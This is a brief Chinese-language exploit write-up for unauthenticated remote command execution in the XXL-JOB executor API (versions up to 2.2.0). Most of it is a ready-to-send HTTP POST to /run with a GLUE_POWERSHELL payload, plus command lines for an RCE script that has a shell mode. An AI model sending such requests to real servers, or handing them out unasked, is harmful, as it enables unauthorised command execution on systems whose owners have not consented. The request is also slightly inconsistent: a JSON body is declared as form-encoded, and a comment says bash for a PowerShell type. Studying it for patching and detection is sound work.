## 漏洞概述

默认情况下XXL-JOB的API接口没有开启认证，未经授权的攻击者可以构造一个恶意请求，实现远程命令执行。

## 影响范围

```http
XXL-JOB <= 2.2.0
```

## POC

```
Goby
```
## EXP

```http
POST /run HTTP/1.1
Host: 127.0.0.1:9999
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded

{
  "jobId": 1,
  "executorHandler": "demoJobHandler",
  "executorParams": "demoJobHandler",
  "executorBlockStrategy": "COVER_EARLY",
  "executorTimeout": 0,
  "logId": 1,
  "logDateTime": 1586629003729,
  "glueType": "GLUE_POWERSHELL",
  "glueSource": "calc", #执行的bash语句
  "glueUpdatetime": 1586699003758,
  "broadcastIndex": 0,
  "broadcastTotal": 0
}
```
```bash
python3 xxl-job-rce.py 192.168.1.1 -c calc
python3 xxl-job-rce.py 192.168.1.1 -c calc -m shell -p 9999
```

## 参考链接

https://github.com/jas502n/xxl-job